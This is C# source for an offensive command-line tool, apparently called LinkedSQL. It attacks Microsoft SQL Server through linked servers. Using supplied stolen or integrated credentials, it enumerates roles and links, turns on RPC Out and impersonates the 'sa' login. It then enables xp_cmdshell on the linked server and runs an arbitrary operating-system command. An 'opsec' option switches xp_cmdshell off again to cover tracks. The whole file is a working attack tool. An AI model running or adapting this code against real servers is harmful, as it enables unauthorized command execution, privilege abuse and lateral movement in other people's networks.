using System;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace LinkedSQL
{
    class Program
    {
        // Global Variables
        public static string instance;
        public static string linked;
        public static string cmdExec;
        public static string rpc;
        public static string checkCmd;
        public static string user;
        public static string pwd;
        public static string customq;
        public static string conStr;
        public static SqlConnection con;
        public static string opsec;
        public static void ShowHelp()
        {
            Console.WriteLine(
                @"
LinkedSQL.exe by @jfoolish_22

Usage: LinkedSQL.exe /instance [sql server] /linkedinstance [known link sql server] /command [command to run]

Options:
    /Instance or /instance                  - The SQL Server instance to target
    /LinkedInstance or /linkedinstance      - The linked instance to target
    /Command or /command                    - Command to run on the linked SQL Server
    /checkRPC or /checkrpc                  - Checks to see if RPC OUT is enabled and will enable if it is turned off.
    /Uname or /uname                        - Username of credentials obtained
    /Pwd or /pwd                            - Password of user obtained
    /Query or /query                        - Custom query to run
    /Opsec or /opsec                        - Run this flag with /Command to disable xp_cmdshell after executing command
    /Help or /help                          - Displays this message fam");
            System.Environment.Exit(0);
        }// END ShowHelp()
        public static String executeQuery(String query, SqlConnection con)
        {
            SqlCommand cmd = new SqlCommand(query, con);
            SqlDataReader reader = cmd.ExecuteReader();
            try
            {
                String result = "";
                while (reader.Read() == true)
                {
                    result += reader[0] + "\n";
                }
                reader.Close();
                return result;
            }// END try()
            catch
            {
                return "";
            }// END catch
        }// END executeQuery()
        public static void checkRPC(String linkedsrv, SqlConnection con)
        {
            //String res = executeQuery($"SELECT is_rpc_out_enabled FROM sys.servers WHERE name = '{linkedsrv}';", con);
            String que = $"SELECT is_rpc_out_enabled FROM sys.servers WHERE name = '{linkedsrv}';";
            SqlCommand com = new SqlCommand(que, con);
            SqlDataReader rea = com.ExecuteReader();
            rea.Read();
            String res = Convert.ToString(rea[0]);
            rea.Close();

            if (res == "False")
            {

                Console.WriteLine($"[!] RPC Out is NOT enabled on '{linkedsrv}'");
                Console.WriteLine("[+] Attempting to enable RPC Out...");

                // Enabling RPC
                que = $"EXEC('sp_serveroption ''{linkedsrv}'', ''rpc out'', true');";
                com = new SqlCommand(que, con);
                rea = com.ExecuteReader();
                rea.Read();
                res = Convert.ToString(rea[0]);
                rea.Close();
                //String change = executeQuery($"EXEC('sp_serveroption ''{linkedsrv}'', ''rpc out'', true');", con);
                if (res == "True")
                {
                    Console.WriteLine("[+] SUCCESS! RPC is now enabled!");
                }
            }
            else
            {
                Console.WriteLine($"[+] RPC Out is enabled on '{linkedsrv}'");
            }
            
        }// END checkRPC
        public static void groupMemb(String grouptToCheck, SqlConnection con)
        {
            String res = executeQuery($"SELECT IS_SRVROLEMEMBER('{grouptToCheck}');", con);
            int role = int.Parse(res);
            
            // Checking query results
            if (role == 1)
            {
                Console.WriteLine($"[+] User is member of the '{grouptToCheck}' group.");
            }// END if YES
            else
            {
                Console.WriteLine($"[-] User is not a member of the '{grouptToCheck}' group.");
            }// END else NOT group
        }// END groupMemb
        static void ParseArgs(string[] args)
        {
            int iter = 0;
            foreach (string item in args)
            {
                switch(item)
                {
                    case "/instance":
                    case "/Instance":
                        instance = args[iter + 1];
                        break;
                    case "/LinkedInstance":
                    case "/linkedinstance":
                        linked = args[iter + 1];
                        break;
                    case "/Command":
                    case "/command":
                        cmdExec = args[iter + 1];
                        checkCmd = "True";
                        break;
                    case "/Help":
                    case "/help":
                        ShowHelp();
                        break;
                    case "/checkRPC":
                    case "/checkrpc":
                        rpc = "True";
                        break;
                    case "/Uname":
                    case "/uname":
                        user = args[iter + 1];
                        break;
                    case "/pwd":
                    case "/Pwd":
                        pwd = args[iter + 1];
                        break;
                    case "/Query":
                    case "/query":
                        customq = args[iter + 1];
                        break;
                    case "/Opsec":
                    case "/opsec":
                        opsec = "True";
                        break;
                }// END switch
                ++iter;
            }// END foreach()

        }// END ParseArgs()
        public static void Main(string[] args)
        {
            //String conStr;
            //SqlConnection con;
            if (args.Length < 1)
            {
                // Displays help msg if no args provided
                ShowHelp();
            }

            // Parse Args
            ParseArgs(args);

            // SQL Connections
            if( user != null)
            {
                // If credentials are provided
                conStr = $"Server = {instance}; Database = master; User id = {user}; Password = {pwd};";
                con = new SqlConnection(conStr);

                // Attempt to connect
                try
                {
                    // Attempt connecting
                    con.Open();
                    Console.WriteLine($"[+] Authenticated to: {instance}");
                }
                catch
                {
                    Console.WriteLine($"[!] Authentication failed at: {instance}");
                    System.Environment.Exit(0);
                }
            }
            else
            { 
                // Run in context of user
                conStr = $"Server = {instance}; Database = master; Integrated Security = True;";
                con = new SqlConnection(conStr);

                // Attempt to connect
                try
                {
                    // Attempt connecting
                    con.Open();
                    Console.WriteLine($"[+] Authenticated to: {instance}");
                }
                catch
                {
                    Console.WriteLine($"[!] Authentication failed : {instance}");
                    System.Environment.Exit(0);
                }
            }



            // Identify permissions for current user
            String login = executeQuery("SELECT SYSTEM_USER;", con);
            Console.WriteLine($"[+] Currently logged in as: {login}");

            String uname = executeQuery("SELECT USER_NAME();", con);
            Console.WriteLine($"[+] Database username: {uname}");

            // Checking for sysadmin rights
            groupMemb("public", con);
            groupMemb("sysadmin", con);

            // Identifying Links
            String res = executeQuery("EXEC sp_linkedservers;", con);
            Console.WriteLine($"[+] Found linked servers: {res}");

            // Allow for queries
            if (customq != null)
            {
                Console.WriteLine($"[+] Sending query: '{customq}'");
                String q = executeQuery(customq, con);
                Console.WriteLine($"[+] Result: {q}");
            }// END if(check for custom queries)
            
            // Identify if rpc out is enabled
            if (rpc == "True")
            {
                checkRPC(linked, con);
            }
            // Enable xp_cmdshell
            if (checkCmd == "True")
            { 
            // Only runs if /Command is provided 
            String adv = executeQuery($"EXECUTE as LOGIN = 'sa'; EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT {linked};", con);
            Console.WriteLine("[+] Enabled show advanced options!");
            
            String xp = executeQuery($"EXECUTE as LOGIN = 'sa'; EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT {linked};", con);
            Console.WriteLine($"[+] Enabled xp_cmdshell on: '{linked}'");

            // Run whoami command via xp_cmdshell
            String cmd = executeQuery($"EXECUTE as LOGIN = 'sa'; EXEC('xp_cmdshell ''{cmdExec}'';') AT {linked};", con);
            Console.WriteLine($"[+] Running '{cmdExec}': '{cmd}'");

                // Runs if user provides /opsec
                if (opsec == "True")
                {
                    String adv0 = executeQuery($"EXECUTE as LOGIN = 'sa'; EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT {linked};", con);
                    String xp0 = executeQuery($"EXECUTE as LOGIN = 'sa'; EXEC('sp_configure ''xp_cmdshell'', 0; reconfigure;') AT {linked};", con);
                    Console.WriteLine("[+] xp_cmdshell was successfuly turned of!");
                }
            }
        }// END Main()
    }
}
